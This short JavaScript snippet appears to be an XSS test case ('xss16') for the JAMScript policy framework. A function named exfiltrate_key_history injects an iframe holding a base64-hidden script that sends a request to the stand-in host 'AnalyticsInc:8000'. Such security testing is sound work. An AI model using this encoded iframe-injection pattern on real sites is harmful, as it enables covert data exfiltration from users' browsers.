function exfiltrate_key_history() {
  var script = document.createElement("iframe");
  script.src = "data:text/html;charset=utf-8;base64,PHNjcmlwdD54bWxodHRwPW5ldyBYTUxIdHRwUmVxdWVzdCgpO3htbGh0dHAub3BlbigiR0VUIiwgImh0dHA6Ly9BbmFseXRpY3NJbmM6ODAwMC9zdWJtaXNzaW9uLmh0bWw/dGVzdD14c3MxNiIsIHRydWUpO3htbGh0dHAuc2VuZChudWxsKTs8L3NjcmlwdD4=";
  var v2 = document.getElementsByTagName("body");
  var v0 = v2[0];
  JAMScript.call(v0.appendChild, v0, [script]);
  return
}
var v1 = document.getElementById("test");
JAMScript.set(v1, "onclick", exfiltrate_key_history);

